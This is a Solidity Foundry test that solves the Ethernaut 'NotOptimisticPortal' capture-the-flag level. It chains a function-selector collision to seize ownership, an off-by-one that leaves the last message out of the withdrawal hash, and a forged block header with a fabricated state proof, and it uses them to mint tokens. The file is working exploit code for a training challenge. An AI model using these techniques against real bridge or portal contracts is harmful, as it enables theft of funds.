// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test} from "forge-std/Test.sol";
import {NotOptimisticPortal} from "../src/levels/NotOptimisticPortal.sol";
import {Lib_RLPWriter} from "../src/helpers/lib/rlp/Lib_RLPWriter.sol";

/// Ethernaut "NotOptimisticPortal" → function-selector collision + off-by-one + self-call privilege.
/// (catalog candidate: selector-collision / forged-cross-chain-message — SC01/SC02.)
///
/// Win (factory validateInstance): totalSupply() > 0 — i.e. reach `_mint` in `executeMessage`, which
/// requires passing `_verifyMessageInclusion` (an MPT proof against an L2 state root).
///
/// Bugs chained:
///  1. **Selector collision:** `transferOwnership_____610165642(address)` has the SAME 4-byte
///     selector (0x3a69197e) as `onMessageReceived(bytes)`. `_executeOperation` only requires that
///     selector, so passing target=portal + that calldata invokes `transferOwnership` — and the call
///     originates from the portal, so `onlyOwner` (which accepts `msg.sender == address(this)`)
///     passes → ownership taken with no prior privilege.
///  2. **Off-by-one:** `_computeMessageSlot`'s accumulator loops `i < len-1`, so the LAST message
///     receiver/data is excluded from the withdrawal hash. We make the last op the privileged
///     state-injection call — it executes but doesn't change the hash we must prove.
///  3. **Self-granted L2 root:** once owner→sequencer (via a helper now owning the portal), the
///     attacker calls `submitNewBlock` with a forged RLP header whose stateRoot they control, then
///     proves a single-leaf trie (L2_TARGET → storageRoot → withdrawalHash=0x01) against it.
/// All in one `executeMessage`: op0 transfers ownership to a helper, op1 (last, off-hash) makes the
/// helper set itself sequencer + submit the forged root, then verification passes and mints.
///
/// Proof-construction technique credit: nerses-asaturyan / Optimism MPT libs.
contract NotOptimisticPortalTest is Test {
    using Lib_RLPWriter for bytes;
    using Lib_RLPWriter for bytes[];

    address constant L2_TARGET = 0x4242424242424242424242424242424242424242;
    bytes4 constant SEL = 0x3a69197e; // onMessageReceived(bytes) == transferOwnership_____610165642(address)

    NotOptimisticPortal portal;
    bytes constant GENESIS =
        hex"f90204a00000000000000000000000000000000000000000000000000000000000000000a01dcc4de8dec75d7aab85b567b6ccd41ad312451b948a7413f0a142fd40d49347940000000000000000000000000000000000000000a0d7d3685b57d9897755fad850b19f7c43debfded002e18a9e8e5b63639882b6f9a0c5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470a0c5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470b90100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000184039fd3988401c9c38080845fc630578b4354465f5061796c6f6164a00000000000000000000000000000000000000000000000000000000000000000880000000000000000";

    function setUp() public {
        // Mirror NotOptimisticPortalFactory.createInstance.
        address governance = address(uint160(uint256(keccak256("governance"))));
        portal = new NotOptimisticPortal("CTFToken", "CTFT", GENESIS, governance);
    }

    function test_solve_not_optimistic_portal() public {
        address attacker = address(this);
        uint256 amount = 1000 ether;
        uint256 salt = 1;
        uint16 bufferIndex = portal.bufferCounter(); // == 1 (genesis used index 0)

        PortalHelper helper = new PortalHelper();

        address[] memory receivers = new address[](2);
        bytes[] memory data = new bytes[](2);
        // op0: ownership grab via selector collision (IN the withdrawal hash).
        receivers[0] = address(portal);
        data[0] = abi.encodePacked(SEL, abi.encode(address(helper)));

        // withdrawalHash with the off-by-one: only element[0] is accumulated.
        bytes32 recHash = keccak256(abi.encode(bytes32(0), receivers[0]));
        bytes32 datHash = keccak256(abi.encode(bytes32(0), data[0]));
        bytes32 withdrawalHash = keccak256(abi.encode(attacker, amount, recHash, datHash, salt));

        // Forge a single-leaf state with L2_TARGET → storageRoot → withdrawalHash=0x01.
        (bytes32 storageRoot, bytes memory storageLeaf) = _storageTrie(withdrawalHash);
        bytes memory accountRlp = _accountState(storageRoot);
        (bytes32 stateRoot, bytes memory stateLeaf) = _stateTrie(accountRlp);

        NotOptimisticPortal.ProofData memory proofs;
        proofs.accountStateRlp = accountRlp;
        bytes[] memory sp = new bytes[](1);
        sp[0] = Lib_RLPWriter.writeBytes(stateLeaf);
        proofs.stateTrieProof = Lib_RLPWriter.writeList(sp);
        bytes[] memory tp = new bytes[](1);
        tp[0] = Lib_RLPWriter.writeBytes(storageLeaf);
        proofs.storageTrieProof = Lib_RLPWriter.writeList(tp);

        bytes memory rlpHeader = _blockHeader(
            portal.latestBlockHash(), stateRoot, portal.latestBlockNumber() + 1, portal.latestBlockTimestamp() + 1
        );

        // op1 (LAST, off-hash): helper (now owner) sets itself sequencer + submits the forged root.
        receivers[1] = address(helper);
        data[1] = abi.encodeWithSelector(SEL, abi.encode(address(portal), rlpHeader, address(0), address(0)));

        portal.executeMessage(attacker, amount, receivers, data, salt, proofs, bufferIndex);

        assertGt(portal.totalSupply(), 0, "win: totalSupply() > 0");
        assertEq(portal.balanceOf(attacker), amount, "minted to attacker");
    }

    // ── single-leaf MPT construction (secure trie: path = keccak(key)) ──
    function _storageTrie(bytes32 key) internal pure returns (bytes32 root, bytes memory leaf) {
        leaf = _leaf(keccak256(abi.encodePacked(key)), Lib_RLPWriter.writeBytes(hex"01"));
        root = keccak256(leaf);
    }

    function _stateTrie(bytes memory accountRlp) internal pure returns (bytes32 root, bytes memory leaf) {
        leaf = _leaf(keccak256(abi.encodePacked(L2_TARGET)), Lib_RLPWriter.writeBytes(accountRlp));
        root = keccak256(leaf);
    }

    /// leaf = RLP([HP(path, leaf=even=0x20 prefix), rlpValue])
    function _leaf(bytes32 hashedKey, bytes memory rlpValue) internal pure returns (bytes memory) {
        bytes memory hp = new bytes(33);
        hp[0] = 0x20;
        for (uint256 i; i < 32; i++) hp[i + 1] = hashedKey[i];
        bytes[] memory fields = new bytes[](2);
        fields[0] = Lib_RLPWriter.writeBytes(hp);
        fields[1] = rlpValue;
        return Lib_RLPWriter.writeList(fields);
    }

    function _accountState(bytes32 storageRoot) internal pure returns (bytes memory) {
        bytes[] memory a = new bytes[](4);
        a[0] = Lib_RLPWriter.writeUint(0); // nonce
        a[1] = Lib_RLPWriter.writeUint(0); // balance
        a[2] = Lib_RLPWriter.writeBytes(abi.encodePacked(storageRoot));
        a[3] = Lib_RLPWriter.writeBytes(abi.encodePacked(keccak256(""))); // empty codeHash
        return Lib_RLPWriter.writeList(a);
    }

    function _blockHeader(bytes32 parentHash, bytes32 stateRoot, uint256 number, uint256 timestamp)
        internal
        pure
        returns (bytes memory)
    {
        bytes[] memory h = new bytes[](12);
        h[0] = Lib_RLPWriter.writeBytes(abi.encodePacked(parentHash));
        h[1] = Lib_RLPWriter.writeBytes(abi.encodePacked(bytes32(0)));
        h[2] = Lib_RLPWriter.writeAddress(address(0));
        h[3] = Lib_RLPWriter.writeBytes(abi.encodePacked(stateRoot));
        h[4] = Lib_RLPWriter.writeBytes(abi.encodePacked(bytes32(0)));
        h[5] = Lib_RLPWriter.writeBytes(abi.encodePacked(bytes32(0)));
        h[6] = Lib_RLPWriter.writeBytes(new bytes(256));
        h[7] = Lib_RLPWriter.writeUint(0);
        h[8] = Lib_RLPWriter.writeUint(number);
        h[9] = Lib_RLPWriter.writeUint(0);
        h[10] = Lib_RLPWriter.writeUint(0);
        h[11] = Lib_RLPWriter.writeUint(timestamp);
        return Lib_RLPWriter.writeList(h);
    }
}

/// Owns the portal (via the selector-collision grab), then injects the forged L2 root.
/// Its onMessageReceived(bytes) has selector 0x3a69197e, so `_executeOperation` accepts it.
interface IPortal {
    function updateSequencer_____76439298743(address) external;
    function submitNewBlock_____37278985983(bytes memory) external;
    function transferOwnership_____610165642(address) external;
}

contract PortalHelper {
    function onMessageReceived(bytes memory messageData) external {
        (address portalAddr, bytes memory rlpHeader, address finalOwner, address finalSeq) =
            abi.decode(messageData, (address, bytes, address, address));
        IPortal p = IPortal(portalAddr);
        p.updateSequencer_____76439298743(address(this)); // we are owner now
        p.submitNewBlock_____37278985983(rlpHeader); // we are sequencer now
        if (finalSeq != address(0)) p.updateSequencer_____76439298743(finalSeq);
        if (finalOwner != address(0)) p.transferOwnership_____610165642(finalOwner);
    }
}
